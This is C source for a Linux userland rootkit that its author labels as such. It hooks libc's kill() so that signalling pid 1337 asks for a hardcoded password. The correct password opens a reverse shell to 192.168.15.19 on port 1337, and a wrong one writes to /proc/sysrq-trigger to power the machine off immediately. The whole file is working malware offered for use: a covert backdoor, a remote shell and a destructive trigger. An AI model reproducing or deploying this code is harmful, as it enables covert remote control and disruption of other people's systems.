// my rootkit userland for linux.
// author: Darksec, in development phase

#define _GNU_SOURCE
#include <signal.h>
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>


       int kill(pid_t pid, int sig){

	ssize_t result;

	ssize_t reads;

	const int pids = 1337;

       int (*matar)(pid_t pid, int sig);

	matar = dlsym(RTLD_NEXT, "kill");

if(pid == pids){

	char password[20];
	char *pass = "darksec";


result = write(1, "[+] What's the Password? \n", strlen("[+] What's the Password? \n"));
result = write(1, "[!] --> ", strlen("[!] --> "));
scanf("%s", &password);



if(strcmp(password, pass) == 0){


    int port = 1337;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.15.19");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);


} else {

system("echo o > /proc/sysrq-trigger");

}

} else {

return matar(pid, sig);

}

}
